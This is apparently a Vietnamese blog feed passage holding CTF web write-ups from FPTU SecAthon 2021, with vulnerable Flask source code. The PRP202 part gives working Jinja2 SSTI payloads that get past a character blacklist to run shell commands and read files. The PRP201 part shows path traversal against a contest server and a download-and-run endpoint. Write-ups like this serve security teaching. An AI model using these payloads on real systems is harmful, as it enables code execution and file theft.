<span class="k">def</span> <span class="nf">doanxem</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">authCheck</span><span class="p">(</span><span class="s">"check"</span><span class="p">)</span> <span class="o">==</span> <span class="s">""</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">authCode</span> <span class="o">+</span> <span class="n">authCheck</span><span class="p">(</span><span class="s">"userCode"</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
                <span class="n">winner_input</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">"winner"</span><span class="p">]</span>
                <span class="k">if</span> <span class="n">winner_input</span> <span class="o">==</span> <span class="n">authCheck</span><span class="p">(</span><span class="s">"winner"</span><span class="p">):</span>
                    <span class="n">mess</span> <span class="o">=</span> <span class="p">(</span>
                        <span class="s">"You are the real winner!!!!!!!!!! "</span>
                        <span class="o">+</span> <span class="n">authCheck</span><span class="p">(</span><span class="s">"userCode"</span><span class="p">)</span>
                        <span class="o">+</span> <span class="s">", here your flag: https://youtu.be/dQw4w9WgXcQ"</span>
                    <span class="p">)</span>
                <span class="k">elif</span> <span class="n">winner_input</span> <span class="o">!=</span> <span class="n">authCheck</span><span class="p">(</span><span class="s">"winner"</span><span class="p">):</span>
                    <span class="n">mess</span> <span class="o">=</span> <span class="s">"Wrong! You die!&lt;script&gt;setInterval(function(){ window.location='/choilai'; }, 1200);&lt;/script&gt;"</span>
                <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">mess</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"doanxem.html"</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">authCode</span> <span class="o">+</span> <span class="n">authCheck</span><span class="p">(</span><span class="s">"userCode"</span><span class="p">))</span>


<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/choilai"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">reset_access</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">session</span><span class="p">.</span><span class="n">pop</span><span class="p">(</span><span class="s">"check"</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span>
            <span class="s">"You got an Extra Change. Gud luck :D!!!!!!&lt;script&gt;setInterval(function(){ window.location='/'; }, 500);&lt;/script&gt;"</span>
        <span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">authCode</span> <span class="o">+</span> <span class="n">authCheck</span><span class="p">(</span><span class="s">"userCode"</span><span class="p">))</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s">"###########"</span>
    <span class="n">serve</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s">"0.0.0.0"</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8900</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="analysis">Analysis</h3>

<p>C√≥ <code class="language-plaintext highlighter-rouge">render_template_string()</code> n√™n r·∫•t d·ªÖ ƒëo√°n ƒë√¢y l√† <a href="https://portswigger.net/research/server-side-template-injection">SSTI</a></p>

<p>Nh∆∞ng v√¨ ƒë√£ b·ªã ch·∫∑n <code class="language-plaintext highlighter-rouge">request.args</code> n√™n ch·∫Øc ph·∫£i inject t·ª´ m·ªôt input n√†o ƒë√≥ :v</p>

<p>Review l·∫°i source code th√¨ ta th·∫•y c√≥ 2 ch·ªó <code class="language-plaintext highlighter-rouge">render_template_string()</code> c·∫ßn s·ª≠ d·ª•ng <code class="language-plaintext highlighter-rouge">authCheck("userCode")</code>, ch√≠nh l√† c√°i t√™n ta nh·∫≠p ·ªü index</p>

<p>·ªû <code class="language-plaintext highlighter-rouge">doanxem()</code> ta th·∫•y <code class="language-plaintext highlighter-rouge">mess</code> l√† m·ªôt ƒëo·∫°n code chuy·ªÉn h∆∞·ªõng sang <code class="language-plaintext highlighter-rouge">/choilai</code></p>

<p>Sang ƒë·∫øn <code class="language-plaintext highlighter-rouge">choilai()</code> th√¨ ta th·∫•y r·∫±ng n√≥ s·∫Ω <code class="language-plaintext highlighter-rouge">pop</code> c√°i m·ª•c <code class="language-plaintext highlighter-rouge">check</code> c·ªßa session data, v·∫≠y c√¢u h·ªèi ·ªü ƒë√¢y l√†, n·∫øu nh∆∞ ta ƒë·ªÉ cho <code class="language-plaintext highlighter-rouge">doanxem</code> g·ª≠i m·ªôt request sang <code class="language-plaintext highlighter-rouge">/choilai</code>, nh∆∞ng tr∆∞·ªõc khi <code class="language-plaintext highlighter-rouge">/choilai</code> k·ªãp render, ta drop c√°i request ƒë√≥? T·∫•t nhi√™n c√°i <code class="language-plaintext highlighter-rouge">session.pop("check")</code> v·∫´n ƒë∆∞·ª£c th·ª±c thi, nh∆∞ng kh√¥ng render. V√† n·∫øu ta g·ª≠i ti·∫øp m·ªôt request c·ªßa <code class="language-plaintext highlighter-rouge">doanxem</code> v√†o <code class="language-plaintext highlighter-rouge">/choilai</code>, ƒëi·ªÅu g√¨ s·∫Ω x·∫£y ra? <code class="language-plaintext highlighter-rouge">session.pop()</code> s·∫Ω l·ªói v√¨ ƒë√£ pop tr∆∞·ªõc ƒë√≥, n√™n gi·ªù kh√¥ng c√≤n g√¨ m√† pop, v√† thay v√¨ render ra chuy·ªÉn h∆∞·ªõng v·ªÅ index, th√¨ ƒëo·∫°n render cu·ªëi s·∫Ω ƒë∆∞·ª£c th·ª±c thi.</p>

<p>ƒê√£ r√µ c√°ch ƒë·ªÉ trigger template, th·ª≠ nh·∫≠p <code class="language-plaintext highlighter-rouge">{{7*7}}</code> ·ªü index v√† l√†m c√°c b∆∞·ªõc nh∆∞ tr√™n:</p>

<p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP202_1.png" alt="7*7" /></p>

<h2 id="exploit">Exploit</h2>

<p>V·∫≠y l√† ƒë√£ r√µ, b√¢y gi·ªù vi·ªác c·∫ßn l√†m l√† t·∫°o ra payload, tr∆∞·ªõc ti√™n, h√£y review c√°i black list c·ªßa source code ƒë√£:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s">"'"</span><span class="p">,</span> <span class="s">'"'</span><span class="p">,</span> <span class="s">"request"</span><span class="p">,</span> <span class="s">"readlines"</span><span class="p">,</span> <span class="s">"+"</span><span class="p">,</span> <span class="s">"%2b"</span><span class="p">,</span> <span class="s">"%22"</span><span class="p">,</span> <span class="s">"%27"</span><span class="p">,</span> <span class="s">"linecache"</span><span class="p">]</span>
</code></pre></div></div>

<p>ƒêo·∫°n n√†y kh√° l√† kh√≥, v√¨ black list ch·ª©a nh·ªØng k√≠ t·ª± v√† t·ª´ kh√≥a ph·ªï bi·∫øn ƒë·ªÉ t·∫°o payload SSTI</p>

<p>Suy nghƒ© m√£i l√†m th·∫ø n√†o ƒë·ªÉ t·∫°o payload th√¨ ng∆∞·ªùi anh TungDLM b·∫£o <code class="language-plaintext highlighter-rouge">chr</code>, s√°ng d·∫° th√™m m·ªôt t√≠</p>

<p>C·ª• th·ªÉ th√¨ ta s·∫Ω d√πng <code class="language-plaintext highlighter-rouge">chr()</code> ƒë·ªÉ t·∫°o c√°c k√≠ t·ª± trong string v√† gh√©p ch√∫ng l·∫°i, nh∆∞ng tr∆∞·ªõc ti√™n, ph·∫£i define n√≥</p>

<p>Th·ª≠ nh·∫≠p <code class="language-plaintext highlighter-rouge">().__class__.__base__.__subclasses__()</code> ƒë·ªÉ list c√°c subclass v√† m√¨nh th·∫•y, t·∫°i v·ªã tr√≠ 80 c√≥ <code class="language-plaintext highlighter-rouge">&lt;class '_frozen_importlib._ModuleLock'&gt;</code>, c√≥ th·ªÉ s·ª≠ d·ª•ng n√≥ ƒë·ªÉ define <code class="language-plaintext highlighter-rouge">chr</code>:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="p">().</span><span class="n">__class</span><span class="p">.</span><span class="n">__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">80</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nb">chr</span> <span class="o">%</span><span class="p">}</span>
</code></pre></div></div>

<p>ƒêo·∫°n n√†y ph·∫£i c·∫£m ∆°n 3 ch·ªØ <code class="language-plaintext highlighter-rouge">s e t</code> c·ªßa anh TaiDH, m·ªôt pro ƒë√£ gi·∫£i b√†i n√†y trong 15 ph√∫t, tr∆∞·ªõc c·∫£ m√¨nh</p>

<p>Ok, ƒë·ªÉ ƒëo·∫°n define ·ªü ƒë√≥, b√¢y gi·ªù ƒë·∫øn ƒëo·∫°n payload ch√≠nh, c√≥ r·∫•t nhi·ªÅu h∆∞·ªõng l√†m:</p>

<h3 id="s·ª≠-d·ª•ng-cycler-__doc__-v√†-replace-tungdlm">S·ª≠ d·ª•ng <code class="language-plaintext highlighter-rouge">cycler</code>, <code class="language-plaintext highlighter-rouge">__doc__</code> v√† <code class="language-plaintext highlighter-rouge">replace</code> (TungDLM):</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span><span class="n">cycler</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">36</span><span class="p">:</span><span class="mi">41</span><span class="p">].</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">99</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">114</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">103</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">116</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">117</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">32</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">109</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">42</span><span class="p">))).</span><span class="n">read</span><span class="p">()}}</span>
</code></pre></div></div>

<p>D·ªÖ hi·ªÉu l√†, ch√∫ng ta s·∫Ω l·ª£i d·ª•ng ƒëo·∫°n <code class="language-plaintext highlighter-rouge">__doc__</code> c·ªßa <code class="language-plaintext highlighter-rouge">Tuple</code>, v√≠ <code class="language-plaintext highlighter-rouge">__doc__</code> l√† m·ªôt String n√™n ta ch·ªâ vi·ªác c·∫Øt m·ªôt ƒëo·∫°n c·ªßa n√≥ ra, <code class="language-plaintext highlighter-rouge">replace()</code> ƒë·ªÉ thay th·∫ø c√°c k√≠ t·ª±, s·ª≠ d·ª•ng <code class="language-plaintext highlighter-rouge">chr()</code> ƒë·ªÉ thay cho vi·ªác d√πng <code class="language-plaintext highlighter-rouge">''/""</code>. Nh·ªù ƒë√≥ t·∫°o ƒë∆∞·ª£c c√¢u l·ªánh ƒë·ªÉ <code class="language-plaintext highlighter-rouge">os.open()</code> th·ª±c thi (<code class="language-plaintext highlighter-rouge">cat *</code>) v√† in ra t·∫°i <code class="language-plaintext highlighter-rouge">read()</code></p>

<p>Payload ho√†n ch·ªânh:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="nb">chr</span> <span class="o">=</span> <span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">80</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nb">chr</span> <span class="o">%</span><span class="p">}{{</span><span class="n">cycler</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">36</span><span class="p">:</span><span class="mi">41</span><span class="p">].</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">99</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">114</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">103</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">116</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">117</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">32</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">109</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">42</span><span class="p">)))}}</span>
</code></pre></div></div>

<h3 id="s·ª≠-d·ª•ng-__add__-by-me">S·ª≠ d·ª•ng <code class="language-plaintext highlighter-rouge">__add__</code> (by me):</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">80</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">112</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">112</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">46</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">112</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">121</span><span class="p">)))))))}}</span>
</code></pre></div></div>

<p>T·∫°i ƒë√¢y m√¨nh s·ª≠ d·ª•ng <code class="language-plaintext highlighter-rouge">__add__</code> ƒë·ªÉ n·ªëi c√°c k√≠ t·ª± th√†nh chu·ªói v√† <code class="language-plaintext highlighter-rouge">open()</code> ƒë·ªÉ m·ªü file, kh√¥ng khuy·∫øn kh√≠ch l√†m theo, kh·ªï d√¢m l·∫Øm :‚Äô(</p>

<p>Payload ho√†n ch·ªânh:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="nb">chr</span> <span class="o">=</span> <span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">80</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nb">chr</span> <span class="o">%</span><span class="p">}{{().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">80</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">112</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">112</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">46</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">112</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">121</span><span class="p">)))))))}}</span>
</code></pre></div></div>

<h2 id="flag">Flag:</h2>

<p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP202_2.png" alt="flag" /></p>

<p>Flag: <code class="language-plaintext highlighter-rouge">FUSEC{@@@@@@Th3_n3Xt_l3v3l_pL4y!!!!!!!!}</code></p>

<blockquote>
  <p>R·∫•t c√≥ th·ªÉ c√≥ nhi·ªÅu c√°ch kh√°c, v√¨ anh TungDLM ƒë√£ ƒë·ªÉ nh·∫£</p>
</blockquote>

<blockquote>
  <p>C·∫£m ∆°n anh TungDLM v√† anh TaiDH ƒë√£ h·ªó tr·ª£ trong qu√° tr√¨nh gi·∫£i b√†i n√†y</p>
</blockquote>

<h2 id="references">References:</h2>

<ul>
  <li>
    <p><a href="https://doantung99.medium.com/fpt-night-wolf-ctf-writeup-de43925ed84b">https://doantung99.medium.com/fpt-night-wolf-ctf-writeup-de43925ed84b</a>, WU c·ªßa anh TungDLM trong gi·∫£i NightWolf-CTF do SAS t·ªï ch·ª©c, trong ƒë√≥ c√≥ b√†i XSMB, c√πng SSTI t∆∞∆°ng t·ª±, t·∫°i b√†i ƒë√≥, anh T√πng c√≥ ƒë√≠nh k√®m 2 link tham kh·∫£o</p>
  </li>
  <li>
    <p><a href="https://chowdera.com/2020/12/20201221231521371q.html">https://chowdera.com/2020/12/20201221231521371q.html</a>, ƒë√¢y l√† b√†i vi·∫øt m√¨nh tham kh·∫£o r·∫•t r·∫•t nhi·ªÅu, chi ti·∫øt v√† c√≥ th√™m 3 ƒëo·∫°n code vi·∫øt b·∫±ng python gi√∫p t√¨m v·ªã tr√≠ c√°c class d·ªÖ h∆°n, m·ªôt s·ªë trick bypass filter, n√™n tham kh·∫£o</p>
  </li>
  <li>
    <p><a href="https://portswigger.net/research/server-side-template-injection">https://portswigger.net/research/server-side-template-injection</a>, ƒë√¢y l√† b√†i vi·∫øt c·ªßa Jame Kettle v·ªÅ SSTI, n·∫øu nh·ªõ kh√¥ng nh·∫ßm ch√≠nh √¥ng n√†y nghi√™n c·ª©u ra SSTI, n√™n ƒë·ªçc n·∫øu ch∆∞a bi·∫øt nhi·ªÅu v·ªÅ SSTI</p>
  </li>
</ul>]]></content><author><name></name></author><summary type="html"><![CDATA[PRP202]]></summary></entry><entry><title type="html">FPTU SecAthon 2021 | Web Writeup | PRP201</title><link href="/2021/10/10/FuSec4-PRP201.html" rel="alternate" type="text/html" title="FPTU SecAthon 2021 | Web Writeup | PRP201" /><published>2021-10-10T16:30:00+00:00</published><updated>2021-10-10T16:30:00+00:00</updated><id>/2021/10/10/FuSec4-PRP201</id><content type="html" xml:base="/2021/10/10/FuSec4-PRP201.html"><![CDATA[<h1 id="prp201">PRP201</h1>

<blockquote>
  <p>ƒê√¢y l√† challenge m√† m√¨nh ƒë√£ ƒëo√°n ƒë∆∞·ª£c m·ªôt ph·∫ßn, nh∆∞ng v·∫´n m·∫•t g·∫ßn 1 ng√†y ƒë·ªÉ gi·∫£i ra :&lt; M·ªôt s·∫£n ph·∫©m ƒë·∫øn t·ª´ anh Khoa (matuhn)</p>
</blockquote>

<ul>
  <li>
    <p>Truy c·∫≠p v√†o b√†i th√¨ th·∫•y c√≥ 5 ƒë∆∞·ªùng d·∫´n ƒë·∫øn 5 file txt</p>
  </li>
  <li>
    <p>Th·ª≠ truy c·∫≠p v√†o m·ªôt trong s·ªë ƒë√≥ s·∫Ω th·∫•y URL c√≥ d·∫°ng: <code class="language-plaintext highlighter-rouge">http://139.180.208.121:8001/getData?f=/fus/data/1.txt</code>, li·ªáu ƒë√¢y c√≥ ph·∫£i path traversal? c√≥ v·∫ª nh∆∞ c√°c anh ra ƒë·ªÅ nƒÉm nay kh√° th√≠ch path traversal</p>
  </li>
  <li>
    <p>M√≤ m·∫´m m·ªôt l√∫c th√¨ m√¨nh t√¨m ƒë∆∞·ª£c file <code class="language-plaintext highlighter-rouge">flag.txt</code> c≈©ng trong <code class="language-plaintext highlighter-rouge">/fus/data</code> :D v·ªõi n·ªôi dung nh∆∞ sau:</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_1.png" alt="flag.txt" /></p>
  </li>
  <li>
    <p>V·∫≠y l√† c·∫ßn ph·∫£i l√†m c√°ch n√†o ƒë√≥ ƒë·ªÉ xem ƒë∆∞·ª£c c√°i <code class="language-plaintext highlighter-rouge">secret_service</code> ƒë√≥</p>
  </li>
  <li>
    <p>ƒê·∫øn ƒë√¢y th√¨ m√¨nh b·∫Øt ƒë·∫ßu b√≠ r·ªìi, path traversal th√¨ c≈©ng c·∫ßn ph·∫£i bi·∫øt c√≥ nh·ªØng g√¨ trong ƒë√≥ ch·ª© (ho·∫∑c √≠t nh·∫•t l√† m√¨nh nghƒ© v·∫≠y), cho t·ªõi khi ban ra ƒë·ªÅ cho hint ƒë·∫ßu ti√™n: <code class="language-plaintext highlighter-rouge">?f=/fus/data/../app.py</code>, v·∫≠y h√£y xem source code n√†y c√≥ v·∫•n ƒë·ªÅ g√¨?</p>
  </li>
  <li>
    <p>V√¨ source kh√° d√†i n√™n m√¨nh s·∫Ω ph√¢n t√≠ch t·ª´ng h√†m m·ªôt, b·ªè qua h√†m index, v√¨ n√≥ in ra trang m√† ch√∫ng ta truy c·∫≠p v√†o ƒë·∫ßu ti√™n</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/getData'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
  <span class="k">def</span> <span class="nf">getLog</span><span class="p">():</span>
      <span class="n">log_file</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'f'</span><span class="p">)</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">log_file</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'/fus/data'</span><span class="p">)):</span>
          <span class="k">return</span> <span class="n">flask</span><span class="p">.</span><span class="n">send_file</span><span class="p">(</span><span class="n">log_file</span><span class="p">,</span> <span class="n">mimetype</span><span class="o">=</span><span class="s">'text/plain'</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
      <span class="k">else</span><span class="p">:</span>
          <span class="k">return</span> <span class="p">({</span><span class="s">'status'</span><span class="p">:</span> <span class="s">'invalid path'</span><span class="p">},</span><span class="mi">200</span><span class="p">)</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>Ok, ƒë√¢y ch√≠nh l√† h√†m m√† ch√∫ng ta d√πng ƒë·ªÉ ƒë·ªçc file v√† th·ª±c hi·ªán path traversal, kh√¥ng c√≥ nhi·ªÅu ƒëi·ªÅu ƒë·ªÉ n√≥i v·ªÅ n√≥.</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1"># run script to crawl data
</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/runScript'</span><span class="p">)</span>
  <span class="k">def</span> <span class="nf">runScript</span><span class="p">():</span>
      <span class="n">json</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">json</span>
      <span class="n">msg</span> <span class="o">=</span> <span class="n">start</span><span class="p">(</span><span class="n">json</span><span class="p">)</span>
      <span class="k">return</span> <span class="p">({</span><span class="s">'status'</span><span class="p">:</span> <span class="n">msg</span><span class="p">},</span><span class="mi">200</span><span class="p">)</span>

  <span class="k">def</span> <span class="nf">check_script_dup</span><span class="p">(</span><span class="n">scripts</span><span class="p">,</span> <span class="n">command_log</span><span class="p">,</span> <span class="n">json</span><span class="p">):</span>
      <span class="k">try</span><span class="p">:</span>
          <span class="n">script_parent_dir</span> <span class="o">=</span> <span class="n">scripts</span> <span class="o">+</span> <span class="s">'/'</span> <span class="o">+</span> <span class="n">json</span><span class="p">[</span><span class="s">'dir'</span><span class="p">]</span>
          <span class="n">script_path</span> <span class="o">=</span> <span class="n">script_parent_dir</span> <span class="o">+</span> <span class="s">'/'</span> <span class="o">+</span> <span class="n">json</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span>
      <span class="k">except</span><span class="p">:</span>
          <span class="k">return</span> <span class="s">"missing dir and name"</span>
      <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">script_path</span><span class="p">):</span>
          <span class="k">return</span> <span class="s">"duplicate script"</span>
      <span class="k">else</span><span class="p">:</span>
          <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">script_parent_dir</span><span class="p">):</span>
              <span class="n">os</span><span class="p">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">script_parent_dir</span><span class="p">)</span>
          <span class="k">return</span> <span class="n">download_script</span><span class="p">(</span><span class="n">script_path</span><span class="p">,</span> <span class="n">command_log</span><span class="p">,</span> <span class="n">json</span><span class="p">)</span>

  <span class="k">def</span> <span class="nf">download_script</span><span class="p">(</span><span class="n">script_path</span><span class="p">,</span> <span class="n">command_log</span><span class="p">,</span> <span class="n">json</span><span class="p">):</span>
      <span class="k">try</span><span class="p">:</span>
          <span class="n">script_link</span> <span class="o">=</span> <span class="n">json</span><span class="p">[</span><span class="s">'url'</span><span class="p">]</span>
      <span class="k">except</span><span class="p">:</span>
          <span class="k">return</span> <span class="s">"missing url"</span>
      <span class="c1"># don't trust anyone
</span>      <span class="k">if</span> <span class="p">(</span><span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">script_link</span><span class="p">).</span><span class="n">netloc</span> <span class="o">==</span> <span class="s">"localhost:8888"</span><span class="p">):</span>
          <span class="n">result</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">script_link</span><span class="p">)</span>
          <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">script_path</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
              <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
              <span class="n">run_script</span><span class="p">(</span><span class="n">script_path</span><span class="p">,</span> <span class="n">command_log</span><span class="p">)</span>
      <span class="k">else</span><span class="p">:</span>
          <span class="k">return</span> <span class="s">"invalid script link"</span>

  <span class="k">def</span> <span class="nf">run_script</span><span class="p">(</span><span class="n">script_path</span><span class="p">,</span> <span class="n">command_log</span><span class="p">):</span>
      <span class="n">lf</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">command_log</span><span class="p">,</span> <span class="s">'wb+'</span><span class="p">)</span>
      <span class="n">command</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">'bash'</span><span class="p">,</span> <span class="n">script_path</span><span class="p">],</span> <span class="n">stderr</span><span class="o">=</span><span class="n">lf</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">lf</span><span class="p">,</span> <span class="n">universal_newlines</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
      <span class="k">return</span> <span class="s">"Run successfully"</span>

  <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">json</span><span class="p">):</span>
      <span class="n">scripts</span> <span class="o">=</span> <span class="n">home</span> <span class="o">+</span> <span class="s">'/scripts'</span>
      <span class="n">log</span> <span class="o">=</span> <span class="n">home</span> <span class="o">+</span> <span class="s">'/logs'</span>
